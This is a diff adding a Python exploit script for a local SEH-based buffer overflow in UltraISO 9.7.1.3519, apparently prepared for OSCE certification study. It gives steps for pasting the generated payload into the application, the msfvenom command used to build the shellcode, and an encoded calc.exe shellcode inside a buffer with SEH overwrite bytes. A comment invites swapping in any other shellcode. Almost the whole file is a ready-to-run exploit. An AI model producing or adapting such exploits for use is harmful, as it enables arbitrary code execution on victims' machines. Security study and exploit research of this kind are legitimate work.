@@ -1,0 +1,51 @@
+#!/usr/bin/python
+# Exploit Title: UltraISO 9.7.1.3519 - Local Buffer Overflow (SEH)
+# Date: 30/01/2019
+# Exploit Author: Dino Covotsos - Telspace Systems 
+# Vendor Homepage: https://www.ultraiso.com/
+# Version: 9.7.1.3519
+# Software Link: https://www.ultraiso.com/download.html
+# Contact: services[@]telspace.co.za
+# Twitter: @telspacesystems (Greets to the Telspace Crew)
+# Tested on: Windows XP Prof SP3 ENG x86
+# CVE: TBC from Mitre
+# Thanks to Francisco Ramirez for the original Windows 10 x64 DOS.
+# Created in preparation for OSCE - DC - Telspace Systems
+# PoC:
+# 1.) Generate exploit.txt, copy the content to clipboard
+# 2.) In the application, click "Make CD/DVD Image"
+# 3.) Paste the contents of exploit.txt under 'Output FileName'
+# 4.) Click OK - Calc POPS (or change shellcode to whatever you require, take note of badchars!)
+
+#0x72d1170b : pop esi # pop ebx # ret 0x04 |  {PAGE_EXECUTE_READ} [msacm32.drv] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v5.1.2600.0
+#NSEH - JMP 0012ED66 (\xEB\x08)
+
+#msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x3a" -f c
+
+shellcode = ("\xda\xc0\xd9\x74\x24\xf4\xbf\x67\xdc\x50\x39\x5d\x2b\xc9\xb1"
+"\x31\x83\xc5\x04\x31\x7d\x14\x03\x7d\x73\x3e\xa5\xc5\x93\x3c"
+"\x46\x36\x63\x21\xce\xd3\x52\x61\xb4\x90\xc4\x51\xbe\xf5\xe8"
+"\x1a\x92\xed\x7b\x6e\x3b\x01\xcc\xc5\x1d\x2c\xcd\x76\x5d\x2f"
+"\x4d\x85\xb2\x8f\x6c\x46\xc7\xce\xa9\xbb\x2a\x82\x62\xb7\x99"
+"\x33\x07\x8d\x21\xbf\x5b\x03\x22\x5c\x2b\x22\x03\xf3\x20\x7d"
+"\x83\xf5\xe5\xf5\x8a\xed\xea\x30\x44\x85\xd8\xcf\x57\x4f\x11"
+"\x2f\xfb\xae\x9e\xc2\x05\xf6\x18\x3d\x70\x0e\x5b\xc0\x83\xd5"
+"\x26\x1e\x01\xce\x80\xd5\xb1\x2a\x31\x39\x27\xb8\x3d\xf6\x23"
+"\xe6\x21\x09\xe7\x9c\x5d\x82\x06\x73\xd4\xd0\x2c\x57\xbd\x83"
+"\x4d\xce\x1b\x65\x71\x10\xc4\xda\xd7\x5a\xe8\x0f\x6a\x01\x66"
+"\xd1\xf8\x3f\xc4\xd1\x02\x40\x78\xba\x33\xcb\x17\xbd\xcb\x1e"
+"\x5c\x31\x86\x03\xf4\xda\x4f\xd6\x45\x87\x6f\x0c\x89\xbe\xf3"
+"\xa5\x71\x45\xeb\xcf\x74\x01\xab\x3c\x04\x1a\x5e\x43\xbb\x1b"
+"\x4b\x20\x5a\x88\x17\x89\xf9\x28\xbd\xd5")
+
+buffer = "A" * 304 + "\xEB\x08\x90\x90" + "\x0b\x17\xd1\x72" + "\x90" * 20 + shellcode + "D" * 9448
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
